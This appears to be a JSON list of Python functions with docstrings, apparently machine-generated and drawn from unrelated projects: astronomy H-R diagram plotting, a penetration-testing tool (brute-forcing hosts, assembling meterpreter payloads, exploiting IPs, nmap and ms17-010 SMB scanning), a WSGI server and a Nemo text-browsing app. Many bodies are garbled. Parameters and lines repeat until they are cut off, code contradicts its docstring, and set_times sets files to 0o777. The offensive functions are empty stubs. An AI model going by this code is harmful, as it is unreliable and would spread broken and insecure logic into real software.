        "def _create_teff_luminosity_array(observed_fields, computed_fields,\n                                teff_luminosity_values,\n                                luminosity_values):\n    \"\"\"Create a numpy.ndarray with all observed fields and\n    computed teff and luminosity values.\n    \"\"\"\n    teff_luminosity_array = np.zeros(len(observed_fields))\n    for i, field in enumerate(observed_fields):\n        teff_luminosity_array[i] = teff_luminosity_values[field]\n    return teff_luminosity_array, luminosity_values",
        "def _get_teff_luminosity(self):\n        \"\"\"Return the numpy array with rounded teff and luminosity columns.\"\"\"\n        teff_luminosity = self.teff_luminosity\n        teff_luminosity = teff_luminosity.reshape(self.teff_luminosity.shape[0],\n                                              self.teff_luminosity.shape[1])\n        return teff_luminosity",
        "def _brute_forces(self,\n                      force_all_greenlets=False,\n                      force_all_greenlets_only=False,\n                      force_all_greenlets_only_and_all_greenlets_are_greenlets=False,\n                      force_all_greenlets_only_and_all_greenlets_are_greenlets_are_greenlets=False,\n                      force_all_greenlets_only_and_all_greenlets_are_greenlets_are_greenlets=False,\n                      force_all_greenlets_only_and_all_greenlets_are_greenlets_are_greenlets=False,\n                      force_all_greenlets_only_and_all_greenlets_are_greenlets_are_greenlets=False,\n                      force_all_greenlets_only_and_all_greenlets_are",
        "def plot_cluster(cluster, fig, ax, title, xlabel, ylabel, title_fontsize,\n                 xlabel_fontsize, ylabel_fontsize,\n                 title_fontweight, ylabel_fontweight,\n                 title_fontfamily, ylabel_fontfamily,\n                 title_fontsize, xlabel_fontsize,\n                 ylabel_fontsize,\n                 title_fontweight, ylabel_fontweight,\n                 title_fontfamily, xlabel_fontsize,\n                 ylabel_fontsize,\n                 title_fontweight, xlabel_fontweight,\n                 xlabel_fontsize, ylabel_fontsize,\n                 xlabel_fontweight, ylabel_fontweight,\n                 xlabel_fontfamily, ylabel_fontfamily,\n                 xlabel_fontsize, ylabel_fontsize,\n                 xlabel_fontweight, ylabel_fontweight,\n                 xlabel_fontfamily, ylabel_fontfamily,\n                 xlabel_fontsize, ylabel_fontsize,\n                 xlabel_fontweight, ylabel",
        "def _get_teff_luminosity(self):\n        \"\"\"Returns rounded teff and luminosity lists.\"\"\"\n        teff = self.teff\n        luminosity = self.luminosity\n        teff_luminosity = teff / teff.sum()\n        luminosity_luminosity = luminosity / luminosity.sum()\n        return teff_luminosity, luminosity_luminosity",
        "def plot_cluster_hrr(cluster, **kwargs):\n    \"\"\"\n    Given a cluster create a Bokeh plot figure creating an\n    H-R diagram.\n    \"\"\"\n    from bokeh.plotting import figure, show\n\n    cluster_hrr = cluster.hrr(**kwargs)\n    show(cluster_hrr)\n    figure()",
        "def get_hrr_ranges(hrr_array):\n    \"\"\"Given a numpy array calculate what the ranges of the H-R\n    diagram should be.\"\"\"\n    hrr_ranges = []\n    for i in range(len(hrr_array)):\n        hrr_ranges.append(np.array([hrr_array[i][0], hrr_array[i][1]]))\n    return hrr_ranges",
        "def plot_hr(data, title, figsize=(8, 6)):\n    \"\"\"\n    Given a numpy array create a Bokeh plot figure creating an\n    H-R diagram.\n    \"\"\"\n    from bokeh.plotting import figure, show\n\n    fig = figure(title=title)\n    show(fig)\n    return fig",
        "def filter_cluster_data(self, filtered_data):\n        \"\"\"Filter the cluster data catalog into the filtered_data\n        catalog, which is what is shown in the H-R diagram.\n\n        Filter on the values of the sliders, as well as the lasso\n        selection in the skyviewer.\n        \"\"\"\n        # Filter on the values of the sliders, as well as the lasso\n        # selection in the skyviewer\n        for slider in self.sliders:\n            if slider.value() == self.selected_lasso:\n                filtered_data = slider.filter(filtered_data)\n        return filtered_data",
        "def start_editor(self, editor):\n        \"\"\"Creates a tempfile and starts the given editor, returns the data afterwards.\"\"\"\n        tempfile = tempfile.NamedTemporaryFile(delete=False)\n        tempfile.close()\n        self.editor = editor\n        self.tempfile = tempfile\n        return tempfile.read()",
        "def change_data(self, data):\n        \"\"\"This functions gives the user a way to change the data that is given as input.\"\"\"\n        if data is None:\n            return\n        if isinstance(data, dict):\n            self.data = data\n        else:\n            self.data = {k: v for k, v in data.items()}",
        "def bruteforce_host(self, host, users, password, domain):\n        \"\"\"\n        Performs a bruteforce for the given users, password, domain on the given host.\n        \"\"\"\n        return self.execute_command('bruteforce', host, users, password, domain)",
        "def set_times(path, access, modified):\n    \"\"\"Set the access and modified times of the file specified by path.\"\"\"\n    if access is None:\n        access = 0o777\n    if modified is None:\n        modified = 0o777\n    try:\n        os.chmod(path, access)\n    except OSError as e:\n        if e.errno != errno.EACCES:\n            raise",
        "def _strip_prefix(self, line):\n        \"\"\"Strip \\\\?\\ prefix in init phase\"\"\"\n        if line.startswith('\\\\?\\ '):\n            return line[2:]\n        return line",
        "def _clean_path(path):\n    \"\"\"Return the path always without the \\\\?\\ prefix.\"\"\"\n    if path.startswith('/'):\n        return path[1:]\n    return path",
        "def format_output(self, tool, output_format):\n        \"\"\"\n        Formats the output of another tool in the given way.\n        Has default styles for ranges, hosts and services.\n        \"\"\"\n        if output_format == 'ranges':\n            return self.format_ranges(tool)\n        elif output_format == 'hosts':\n            return self.format_hosts(tool)\n        elif output_format == 'services':\n            return self.format_services(tool)",
        "def print_line(line):\n    \"\"\"Print the given line to stdout\"\"\"\n    if line:\n        print(line)\n    sys.stdout.flush()",
        "def get_ip():\n    \"\"\"Gets the IP from the inet interfaces.\"\"\"\n    for interface in socket.getifaddrs():\n        if interface.family == socket.AF_INET:\n            return interface.addr\n    return None",
        "def from_array(arr, columns=None, names=None, max_rows=None, precision=None):\n    \"\"\"Create a pandas DataFrame from a numpy ndarray.\n\n    By default use temp and lum with max rows of 32 and precision of 2.\n\n    arr - An numpy.ndarray.\n    columns - The columns to include in the pandas DataFrame. Defaults to\n              temperature and luminosity.\n    names - The column names for the pandas DataFrame. Defaults to\n            Temperature and Luminosity.\n    max_rows - If max_rows is an integer then set the pandas\n               display.max_rows option to that value. If max_rows\n               is True then set display.max_rows option  to 1000.\n    precision - An integer to set the pandas precision option.\n    \"\"\"\n    if max_rows is None:\n        max_rows = 1000\n    if precision",
        "def strip_labels(self):\n        \"\"\"Strips labels.\"\"\"\n        for label in self.labels:\n            self.labels.remove(label)",
        "def remove_namespace(self, namespace):\n        \"\"\"Remove namespace in the passed document in place.\"\"\"\n        if namespace in self.namespaces:\n            del self.namespaces[namespace]",
        "def can_retrieve(self, uri):\n        \"\"\"Check to see if this URI is retrievable by this Retriever implementation\n\n        :param uri: the URI of the resource to be retrieved\n        :type uri: str\n        :return: True if it can be, False if not\n        :rtype: bool\n        \"\"\"\n        if self.is_root:\n            return True\n        if self.is_root_uri:\n            return False\n        if self.is_root_path:\n            return False\n        if self.is_root_path_uri:\n            return False\n        if self.is_root_path_path:\n            return False\n        if self.is_root_path_path_uri:\n            return False\n        if self.is_root_path_path_uri:\n            return False\n        if self.is_root_path_",
        "def hook(name):\n  \"\"\"\n  Decorator used to tag a method that should be used as a hook for the\n  specified `name` hook type.\n  \"\"\"\n  def decorator(func):\n    @wraps(func)\n    def wrapper(*args, **kwargs):\n      hook = Hook(name)\n      hook.register(func)\n      return hook.run(*args, **kwargs)\n    return wrapper\n  return decorator",
        "def subscribe(callable, name):\n    \"\"\"\n    Subscribes `callable` to listen to events of `name` type. The\n    parameters passed to `callable` are dependent on the specific\n    event being triggered.\n    \"\"\"\n    def wrapper(event):\n        return callable(event, name, *event.args, **event.kwargs)\n    return wrapper",
        "def configure(argv=None):\n    \"\"\"\n    Configures this engine based on the options array passed into\n    `argv`. If `argv` is ``None``, then ``sys.argv`` is used instead.\n    During configuration, the command line options are merged with\n    previously stored values. Then the logging subsystem and the\n    database model are initialized, and all storable settings are\n    serialized to configurations files.\n    \"\"\"\n    if argv is None:\n        argv = sys.argv\n\n    # Merge command line options with previously stored values.\n    options = merge_options(argv)\n\n    # Initialize the logging subsystem.\n    setup_logging(options)\n\n    # Initialize the database model.\n    setup_db(options)\n\n    # Load all storable settings.\n    load_settings(options)\n\n    # Save all storable settings.\n    save_",
        "def _assemble_with_columns(self, columns, *args, **kwargs):\n        \"\"\"Alias for _assemble_with_columns\"\"\"\n        return self._assemble_with_columns(columns, *args, **kwargs)",
        "def query(self, query, commit=True):\n        \"\"\"Execute a query with provided parameters \n\n        Parameters\n        :query:     SQL string with parameter placeholders\n        :commit:    If True, the query will commit\n        :returns:   List of rows\n        \"\"\"\n        self.conn.execute(query)\n        if commit:\n            self.conn.commit()\n        return self.conn.fetchall()",
        "def _handle_columns(self, columns):\n        \"\"\"\n        Handle provided columns and if necessary, convert columns to a list for \n        internal strage.\n\n        :columns: A sequence of columns for the table. Can be list, comma\n            -delimited string, or IntEnum.\n        \"\"\"\n        if isinstance(columns, (list, tuple)):\n            columns = [self._handle_column(c) for c in columns]\n        elif isinstance(columns, IntEnum):\n            columns = [columns]\n        return columns",
        "def execute(self, sql_string, *args, **kwargs):\n        \"\"\"Execute a DML query \n\n        :sql_string:    An SQL string template\n        :*args:         Arguments to be passed for query parameters.\n        :commit:        Whether or not to commit the transaction after the query\n        :returns:       Psycopg2 result\n        \"\"\"\n        self.cursor.execute(sql_string, args)\n        if kwargs.get('commit'):\n            self.commit()\n        return self.cursor.fetchone()",
        "def select(self, sql_string, *columns, **args):\n        \"\"\"\n        Execute a SELECT statement \n\n        :sql_string:    An SQL string template\n        :columns:       A list of columns to be returned by the query\n        :*args:         Arguments to be passed for query parameters.\n        :returns:       Psycopg2 result\n        \"\"\"\n        cursor = self.cursor()\n        cursor.execute(sql_string, columns, *args)\n        return cursor.fetchone()",
        "def get(self, pk):\n        \"\"\"\n        Retreive a single record from the table.  Lots of reasons this might be\n        best implemented in the model\n\n        :pk:            The primary key ID for the record\n        :returns:       List of single result\n        \"\"\"\n        query = self.query.filter(self.pk == pk)\n        return query.one()",
        "def _create_payload(self, x86_meterpreters, x64_meterpreters):\n        \"\"\"Creates the final payload based on the x86 and x64 meterpreters.\"\"\"\n        payload = []\n        for meterpreter in x86_meterpreters:\n            payload.append(meterpreter.create_payload())\n        for meterpreter in x64_meterpreters:\n            payload.append(meterpreter.create_payload())\n        return payload",
        "def combine_files(self, files):\n        \"\"\"Combines the files 1 and 2 into 3.\"\"\"\n        for f in files:\n            self.files.append(f)\n            self.files.append(f)\n            self.files.append(f)\n            self.files.append(f)\n            self.files.append(f)\n            self.files.append(f)\n            self.files.append(f)\n            self.files.append(f)\n            self.files.append(f)\n            self.files.append(f)\n            self.files.append(f)\n            self.files.append(f)\n            self.files.append(f)\n            self.files.append(f)\n            self.files.append(f)\n            self.files.append(f)\n            self.files.append(f",
        "def detect_os(self):\n        \"\"\"Runs the checker.py scripts to detect the os.\"\"\"\n        self.log.info(\"Detecting OS\")\n        self.log.debug(\"Checking for Python versions\")\n        self.check_python_versions()\n        self.log.debug(\"Checking for Windows versions\")\n        self.check_windows_versions()\n        self.log.debug(\"Checking for Linux versions\")\n        self.check_linux_versions()\n        self.log.debug(\"Checking for Mac OS X versions\")\n        self.check_mac_osx_versions()\n        self.log.debug(\"Checking for Windows 10 versions\")\n        self.check_windows_10_versions()\n        self.log.debug(\"Checking for Windows 10 RPI versions\")\n        self.check_windows_10_rpi_versions()\n        self.log.debug(\"Checking for Windows",
        "def start(self, auto=False):\n        \"\"\" Starts the exploiting phase, you should run setup before running this function.\n            if auto is set, this function will fire the exploit to all systems. Otherwise a curses interface is shown.\n        \"\"\"\n        self.auto = auto\n        self.exploit()\n        self.setup()\n        self.show()",
        "def exploit_ip(self, ip, exploit_type, exploit_value):\n        \"\"\"Exploits a single ip, exploit is based on the given operating system.\"\"\"\n        if exploit_type == 'host':\n            self.exploit_host(ip, exploit_value)\n        elif exploit_type == 'user':\n            self.exploit_user(ip, exploit_value)\n        elif exploit_type == 'group':\n            self.exploit_group(ip, exploit_value)\n        elif exploit_type == 'network':\n            self.exploit_network(ip, exploit_value)\n        elif exploit_type == 'service':\n            self.exploit_service(ip, exploit_value)\n        elif exploit_type == 'service_group':\n            self.exp",
        "def create_server(host, port, app=None,\n                  server_class=AsyncWsgiServer,\n                  handler_class=AsyncWsgiHandler,\n                  ws_handler_class=None,\n                  ws_path='/ws'):\n    \"\"\"Create server instance with an optional WebSocket handler\n\n    For pure WebSocket server ``app`` may be ``None`` but an attempt to access\n    any path other than ``ws_path`` will cause server error.\n    \n    :param host: hostname or IP\n    :type host: str\n    :param port: server port\n    :type port: int\n    :param app: WSGI application\n    :param server_class: WSGI server class, defaults to AsyncWsgiServer\n    :param handler_class: WSGI handler class, defaults to AsyncWsgiHandler\n    :param ws_handler_class: WebSocket hanlder class",
        "def poll(self, timeout=None):\n        \"\"\"Poll active sockets once\n\n        This method can be used to allow aborting server polling loop\n        on some condition.\n\n        :param timeout: polling timeout\n        \"\"\"\n        if not self.sockets:\n            return\n        if timeout is None:\n            timeout = self.timeout\n        for sock in self.sockets:\n            sock.poll(timeout)",
        "def start(self, poll_interval=None):\n        \"\"\"Start serving HTTP requests\n\n        This method blocks the current thread.\n\n        :param poll_interval: polling timeout\n        :return:\n        \"\"\"\n        if self.is_running:\n            raise RuntimeError('Server is already running')\n        self.is_running = True\n        self.poll_interval = poll_interval\n        self.server = httpd.HTTPServer(self.app)\n        self.server.listen(self.port)\n        self.server.sockets[0].setblocking(False)\n        self.server.sockets[1].setblocking(False)\n        self.server.sockets[2].setblocking(False)\n        self.server.sockets[3].setblocking(False)\n        self.server.sockets[4].setblocking(False)\n        self.",
        "def write_triple_file(triple_file, triples):\n    \"\"\"write triples into a translation file.\"\"\"\n    with open(triple_file, 'w') as f:\n        f.write(' '.join(triple))",
        "def write_triples(self, triples):\n        \"\"\"write triples to file.\"\"\"\n        with open(self.file, 'w') as f:\n            f.write('# %s\\n' % self.version)\n            f.write('# %s\\n' % self.author)\n            f.write('# %s\\n' % self.copyright)\n            f.write('# %s\\n' % self.license)\n            f.write('# %s\\n' % self.copyright)\n            f.write('# %s\\n' % self.license)\n            f.write('# %s\\n' % self.copyright)\n            f.write('# %s\\n' % self.license)\n            f.write('# %s\\n' % self.copyright)\n            f.write('# %s\\n'",
        "def _read_protobuf_mapcontainer(self, filename):\n    \"\"\"Returns protobuf mapcontainer. Read from translation file.\"\"\"\n    with open(filename, 'r') as f:\n      return self._read_protobuf_mapcontainer_from_file(f)",
        "def _get_entities_or_relations(text):\n    \"\"\"Returns map with entity or relations from plain text.\"\"\"\n    entities = {}\n    relations = {}\n    for line in text.splitlines():\n        line = line.strip()\n        if line:\n            if line.startswith('@'):\n                entity = line[1:]\n                if entity not in entities:\n                    entities[entity] = []\n                entities[entity].append(line)\n            elif line.startswith('@'):\n                relation = line[1:]\n                if relation not in relations:\n                    relations[relation] = []\n                    relations[relation].append(line)\n    return entities, relations",
        "def print_tags(self):\n        \"\"\"\n        Prints an overview of the tags of the hosts.\n        \"\"\"\n        print(\"Tags:\")\n        for tag in self.tags:\n            print(\"{0} ({1})\".format(tag, self.tags[tag]))",
        "def main():\n    \"\"\"Main credentials tool\"\"\"\n    parser = argparse.ArgumentParser(description='Manage credentials')\n    parser.add_argument('-c', '--config', dest='config', required=True,\n                        help='Path to config file')\n    parser.add_argument('-d', '--debug', dest='debug', required=False,\n                        action='store_true', default=False,\n                        help='Enable debug output')\n    parser.add_argument('-v', '--verbose', dest='verbose', required=False,\n                        action='store_true', default=False,\n                        help='Enable verbose output')\n    parser.add_argument('-r', '--remote', dest='remote', required=False,\n                        action='store_true', default=False,\n                        help='Use remote server')\n    parser.add_argument('-p', '--port', dest='port",
        "def duplicate_credentials(self):\n        \"\"\"Provides an overview of the duplicate credentials.\"\"\"\n        return {\n            'id': 'duplicate_credentials',\n            'title': 'Duplicate Credentials',\n            'description': 'This is a list of all the credentials that have been '\n                          'used for the same account.',\n            'subtitle': 'Duplicate Credentials',\n            'resources': {\n                'images': {\n                    'title': 'Images',\n                    'description': 'The images that are used for the account.',\n                    'subtitle': 'Images',\n                    'type': 'image',\n                    'subresource_labels': {\n                        'name': 'images',\n                        'type': 'image',\n                    },\n                    'required': True,\n                    'format': 'json',\n                    'subresource_types': {\n                        'name': 'image',\n                        'type': '",
        "def register_nemo(self, nemo: Nemo):\n        \"\"\"\n        Register nemo and parses annotations\n\n        .. note:: Process parses the annotation and extends informations about the target URNs by retrieving resource in range\n\n        :param nemo: Nemo\n        \"\"\"\n        self.nemos.append(nemo)\n        self.nemo_annotations.append(nemo.annotations)\n        self.nemo_annotations_by_uri.append(nemo.annotations_by_uri)",
        "def start(self):\n        \"\"\"Starts the loop to provide the data from jackal.\"\"\"\n        self.running = True\n        self.loop = asyncio.get_event_loop()\n        self.loop.run_until_complete(self.start_loop())",
        "def _create_search_query(self):\n        \"\"\"Creates a search query based on the section of the config file.\"\"\"\n        query = self.config.get('search', 'query')\n        if query:\n            return query\n        else:\n            return self.config.get('search', 'query_default')",
        "def create_workers(self, configfile):\n        \"\"\"Creates the workers based on the given configfile to provide named pipes in the directory.\"\"\"\n        self.workers = []\n        for worker in self.workers_from_config(configfile):\n            self.workers.append(Worker(self, worker))",
        "def _load_config(self):\n        \"\"\"Loads the config and handles the workers.\"\"\"\n        self.config = Config(self.config_file)\n        self.workers = self.config.get('workers', {})\n        self.workers_per_host = self.config.get('workers_per_host', 1)\n        self.workers_per_job = self.config.get('workers_per_job', 1)\n        self.workers_per_job_per_host = self.config.get(\n            'workers_per_job_per_host', 1)\n        self.workers_per_job_per_host_per_job = self.config.get(\n            'workers_per_job_per_host_per_job', 1)\n        self.workers_per_job_per_host_per_job_per_job = self",
        "def replace_isocode(isocode, lang):\n    \"\"\"Replace isocode by its language equivalent\n\n    :param isocode: Three character long language code\n    :param lang: Lang in which to return the language name\n    :return: Full Text Language Name\n    \"\"\"\n    if isocode.startswith('0x'):\n        isocode = isocode[2:]\n    if isocode.startswith('0x'):\n        isocode = isocode[2:]\n    if isocode.startswith('0x'):\n        isocode = isocode[2:]\n    if isocode.startswith('0x'):\n        isocode = isocode[2:]\n    if isocode.startswith('0x'):\n        isocode = isocode[2:]\n    if isocode.startswith('0x'):\n        isocode = isocode[2",
        "def _get_citation_levels(reffs, citation):\n    \"\"\"\n    A function to construct a hierarchical dictionary representing the different citation layers of a text\n\n    :param reffs: passage references with human-readable equivalent\n    :type reffs: [(str, str)]\n    :param citation: Main Citation\n    :type citation: Citation\n    :return: nested dictionary representing where keys represent the names of the levels and the final values represent the passage reference\n    :rtype: OrderedDict\n    \"\"\"\n    levels = OrderedDict()\n    for level in citation.levels:\n        levels[level.name] = level\n    for ref in reffs:\n        levels[ref[0]] = ref[1]\n    return levels",
        "def human_readable_string(string, lang):\n    \"\"\"\n    Take a string of form %citation_type|passage% and format it for human\n\n    :param string: String of formation %citation_type|passage%\n    :param lang: Language to translate to\n    :return: Human Readable string\n\n    .. note :: To Do : Use i18n tools and provide real i18n\n    \"\"\"\n    if not string:\n        return string\n\n    if lang == 'en':\n        return string\n\n    if lang == 'zh':\n        return string.replace('|', ' ')\n\n    return string.replace('|', ' ')",
        "def filter_annotations(annotations, type_uri, number):\n    \"\"\"Annotation filtering filter\n\n    :param annotations: List of annotations\n    :type annotations: [AnnotationResource]\n    :param type_uri: URI Type on which to filter\n    :type type_uri: str\n    :param number: Number of the annotation to return\n    :type number: int\n    :return: Annotation(s) matching the request\n    :rtype: [AnnotationResource] or AnnotationResource\n    \"\"\"\n    if type_uri == \"Annotation\":\n        return [annotation for annotation in annotations if annotation.number == number]\n    elif type_uri == \"AnnotationSet\":\n        return [annotation for annotation in annotations if annotation.set_number == number]\n    elif type_uri == \"AnnotationSetAnnotation\":\n        return [annotation for annotation in annotations if annotation.annotation_number == number]\n    else:",
        "def _is_http_or_https(self, service):\n        \"\"\"Connect to a service to see if it is a http or https server.\"\"\"\n        if self.is_http(service):\n            return True\n        elif self.is_https(service):\n            return True\n        else:\n            raise ValueError(\"Unknown service: %s\" % service)",
        "def _get_services(self):\n        \"\"\"Retrieves services starts check_service in a gevent pool of 100.\"\"\"\n        services = []\n        for i in range(0, 100):\n            service = self._get_service()\n            if service:\n                services.append(service)\n        return services",
        "def _ImportNmapResult(self, result):\n    \"\"\"Imports the given nmap result.\"\"\"\n    if result.HasField(\"nmap_result\"):\n      self.nmap_result = result.nmap_result\n    else:\n      self.nmap_result = None",
        "def start_nmap_process(self, ip, args, **kwargs):\n        \"\"\"Start an nmap process with the given args on the given ips.\"\"\"\n        if not self.nmap_process:\n            self.nmap_process = self.nmap_process_class(ip, args, **kwargs)\n        return self.nmap_process",
        "def _scan_hosts(self, hosts):\n        \"\"\"Scans the given hosts with nmap.\"\"\"\n        for host in hosts:\n            try:\n                self._nmap.scan(host)\n            except nmap.NMapError as e:\n                self._log.error(\"Failed to scan host %s: %s\", host, e)",
        "def _scan_smb_services(self):\n        \"\"\"Scans available smb services in the database for smb signing and ms17-010.\"\"\"\n        for service in self.services:\n            if service.name == 'smb':\n                self.smb_services.append(service)\n                if service.name == 'ms17-010':\n                    self.ms17_010_services.append(service)",
        "def print_overview(self):\n        \"\"\"\n        Function to create an overview of the services.\n        Will print a list of ports found an the number of times the port was seen.\n        \"\"\"\n        print(\"Services:\")\n        for service in self.services:\n            print(\"  %s\" % service.name)\n            print(\"    %s\" % service.description)\n            print(\"    %s\" % service.type)\n            print(\"    %s\" % service.type_description)\n            print(\"    %s\" % service.type_description)\n            print(\"    %s\" % service.type_description)\n            print(\"    %s\" % service.type_description)\n            print(\"    %s\" % service.type_description)\n            print(\"    %s\" % service.type_description)\n            print(\"    %s\" % service",
        "def rename_endpoint_fn(fn_name, instance):\n    \"\"\"Rename endpoint function name to avoid conflict when namespacing is set to true\n\n    :param fn_name: Name of the route function\n    :param instance: Instance bound to the function\n    :return: Name of the new namespaced function name\n    \"\"\"\n    if not fn_name.startswith('_'):\n        fn_name = '_' + fn_name\n    return fn_name",
        "def get_best_locale(self):\n        \"\"\"Retrieve the best matching locale using request headers\n\n        .. note:: Probably one of the thing to enhance quickly.\n\n        :rtype: str\n        \"\"\"\n        best_locale = self.request.headers.get('Accept-Language', None)\n        if best_locale is None:\n            best_locale = self.request.headers.get('Accept-Language', 'en')\n        return best_locale",
        "def transform(self, work, xml, objectId, subreference):\n        \"\"\"\n        Transform input according to potentially registered XSLT\n\n        .. note:: Since 1.0.0, transform takes an objectId parameter which represent the passage which is called\n\n        .. note:: Due to XSLT not being able to be used twice, we rexsltise the xml at every call of xslt\n\n        .. warning:: Until a C libxslt error is fixed ( https://bugzilla.gnome.org/show_bug.cgi?id=620102 ), \\\n        it is not possible to use strip tags in the xslt given to this application\n\n        :param work: Work object containing metadata about the xml\n        :type work: MyCapytains.resources.inventory.Text\n        :param xml: XML to transform\n        :type xml: etree._Element\n        :param objectId: Object Identifier\n        :type",
        "def inventory(self):\n        \"\"\"Request the api endpoint to retrieve information about the inventory\n\n        :return: Main Collection\n        :rtype: Collection\n        \"\"\"\n        return Collection(self.client.get(self.api_url + 'inventory'), self.client)",
        "def get_children(self, objectId, subreference, collection, export_collection=False):\n        \"\"\"\n        Retrieve and transform a list of references.\n\n        Returns the inventory collection object with its metadata and a callback function taking a level parameter \\\n        and returning a list of strings.\n\n        :param objectId: Collection Identifier\n        :type objectId: str\n        :param subreference: Subreference from which to retrieve children\n        :type subreference: str\n        :param collection: Collection object bearing metadata\n        :type collection: Collection\n        :param export_collection: Return collection metadata\n        :type export_collection: bool\n        :return: Returns either the list of references, or the text collection object with its references as tuple\n        :rtype: (Collection, [str]) or [str]\n        \"\"\"\n        if export_collection:\n            return self.export_collection(objectId, sub",
        "def retrievePassage(self, objectId, subreference):\n        \"\"\"\n        Retrieve the passage identified by the parameters\n\n        :param objectId: Collection Identifier\n        :type objectId: str\n        :param subreference: Subreference of the passage\n        :type subreference: str\n        :return: An object bearing metadata and its text\n        :rtype: InteractiveTextualNode\n        \"\"\"\n        return self.retrieveObject(objectId, subreference,\n                                    self.passages,\n                                    self.passages.get(objectId, None))",
        "def get_siblings(self, objectId, subreference, passage=None):\n        \"\"\"\n        Get siblings of a browsed subreference\n\n        .. note:: Since 1.0.0c, there is no more prevnext dict. Nemo uses the list of original\\\n        chunked references to retrieve next and previous, or simply relies on the resolver to get siblings\\\n        when the subreference is not found in given original chunks.\n\n        :param objectId: Id of the object\n        :param subreference: Subreference of the object\n        :param passage: Current Passage\n        :return: Previous and next references\n        :rtype: (str, str)\n        \"\"\"\n        if passage is None:\n            passage = self.passage\n        return self.resolver.get_siblings(objectId, subreference, passage)",
        "def _get_seo_string(self, collection, parent):\n        \"\"\"\n        Generates a SEO friendly string for given collection\n\n        :param collection: Collection object to generate string for\n        :param parent: Current collection parent\n        :return: SEO/URL Friendly string\n        \"\"\"\n        if parent:\n            return self._get_seo_string(parent)\n        else:\n            return collection.title",
        "def _create_title(collection, text, subreference, lang):\n        \"\"\"\n        Creates a CoINS Title string from information\n\n        :param collection: Collection to create coins from\n        :param text: Text/Passage object\n        :param subreference: Subreference\n        :param lang: Locale information\n        :return: Coins HTML title value\n        \"\"\"\n        title = ''\n        if text:\n            title = text.title\n        if subreference:\n            title = subreference.title\n        if lang:\n            title = lang.title\n        return title",
        "def _build_member_dict_view(self, member, collection, lang):\n        \"\"\"\n        Build an ancestor or descendant dict view based on selected information\n\n        :param member: Current Member to build for\n        :param collection: Collection from which we retrieved it\n        :param lang: Language to express data in\n        :return:\n        \"\"\"\n        if not self.is_member_in_collection(member, collection):\n            return\n\n        if self.is_member_in_collection(member, collection):\n            return\n\n        if self.is_member_in_collection(member, collection):\n            return\n\n        if self.is_member_in_collection(member, collection):\n            return\n\n        if self.is_member_in_collection(member, collection):\n            return\n\n        if self.is_member_in_collection(member,",
        "def _build_members(self, collection, lang):\n        \"\"\"\n        Build member list for given collection\n\n        :param collection: Collection to build dict view of for its members\n        :param lang: Language to express data in\n        :return: List of basic objects\n        \"\"\"\n        members = []\n        for member in collection.get_members(lang):\n            members.append(self._build_member(member, lang))\n        return members",
        "def _build_parents(self, collection, lang):\n        \"\"\"\n        Build parents list for given collection\n\n        :param collection: Collection to build dict view of for its members\n        :param lang: Language to express data in\n        :return: List of basic objects\n        \"\"\"\n        parents = []\n        for member in collection:\n            if isinstance(member, dict):\n                parents.append(self._build_parents(member, lang))\n            elif isinstance(member, list):\n                parents.append(self._build_parents(member, lang))\n            else:\n                parents.append(member)\n        return parents",
        "def collections(self, lang='en'):\n        \"\"\"Retrieve the top collections of the inventory\n\n        :param lang: Lang in which to express main data\n        :type lang: str\n        :return: Collections information and template\n        :rtype: {str: Any}\n        \"\"\"\n        return self._get(\n            self.base_url + 'collections',\n            params={'lang': lang},\n            headers=self.headers,\n            verify=self.verify_ssl,\n            auth=self.auth,\n            proxy=self.proxy,\n        )",
        "def collection_content_browsing(self, objectId, lang):\n        \"\"\"\n        Collection content browsing route function\n\n        :param objectId: Collection identifier\n        :type objectId: str\n        :param lang: Lang in which to express main data\n        :type lang: str\n        :return: Template and collections contained in given collection\n        :rtype: {str: Any}\n        \"\"\"\n        collection = self.get_collection(objectId)\n        return self.render_template(\n            'collections/content_browsing.html',\n            collection=collection,\n            lang=lang\n        )",
        "def text_exemplar_references_browsing_route(self, objectId, lang):\n        \"\"\"\n        Text exemplar references browsing route function\n\n        :param objectId: Collection identifier\n        :type objectId: str\n        :param lang: Lang in which to express main data\n        :type lang: str\n        :return: Template and required information about text with its references\n        \"\"\"\n        text_exemplar_references_browsing_data = self.get_text_exemplar_references_browsing_data(objectId, lang)\n        return self.render_template(\n            'text_exemplar_references_browsing.html',\n            text_exemplar_references_browsing_data=text_exemplar_references_browsing_data,\n            lang=lang,\n",
        "def redirect(self, objectId, text):\n        \"\"\"\n        Provides a redirect to the first passage of given objectId\n\n        :param objectId: Collection identifier\n        :type objectId: str\n        :return: Redirection to the first passage of given text\n        \"\"\"\n        text = self.getText(objectId)\n        return self.getFirstPassage(text)",
        "def get_text(self, objectId, lang, subreference):\n        \"\"\"Retrieve the text of the passage\n\n        :param objectId: Collection identifier\n        :type objectId: str\n        :param lang: Lang in which to express main data\n        :type lang: str\n        :param subreference: Reference identifier\n        :type subreference: str\n        :return: Template, collections metadata and Markup object representing the text\n        :rtype: {str: Any}\n        \"\"\"\n        return self.get_object(objectId, lang, subreference).text",
        "def get(self, filetype, asset):\n        \"\"\"\n        Route for specific assets.\n\n        :param filetype: Asset Type\n        :param asset: Filename of an asset\n        :return: Response\n        \"\"\"\n        if filetype == 'image':\n            return self.serve_image(asset)\n        elif filetype == 'audio':\n            return self.serve_audio(asset)\n        elif filetype == 'video':\n            return self.serve_video(asset)\n        else:\n            return self.serve_file(asset)",
        "def _register_assets(self):\n        \"\"\"\n        Merge and register assets, both as routes and dictionary\n\n        :return: None\n        \"\"\"\n        for asset in self.assets:\n            if isinstance(asset, dict):\n                self.assets.update(asset)\n            else:\n                self.assets.append(asset)",
        "def create_blueprint(self):\n        \"\"\"Create blueprint and register rules\n\n        :return: Blueprint of the current nemo app\n        :rtype: flask.Blueprint\n        \"\"\"\n        blueprint = Blueprint(self.name, __name__, url_prefix=self.url_prefix)\n        blueprint.add_url_rule(\n            self.url_prefix + 'list',\n            self.list,\n            methods=['GET'],\n            defaults={'page': 1},\n        )\n        blueprint.add_url_rule(\n            self.url_prefix + 'create',\n            self.create,\n            methods=['POST'],\n            defaults={'page': 1},\n        )\n        blueprint.add_url_rule(\n            self.url_prefix + 'edit',\n            self.edit,\n            methods=['GET'],\n            defaults={'page':",
        "def create_view(self, name):\n        \"\"\"Create a view\n\n        :param name: Name of the route function to use for the view.\n        :type name: str\n        :return: Route function which makes use of Nemo context (such as menu informations)\n        :rtype: function\n        \"\"\"\n        def view(request, *args, **kwargs):\n            \"\"\"Create a view\"\"\"\n            return self.view_factory(name, request, *args, **kwargs)\n        return view",
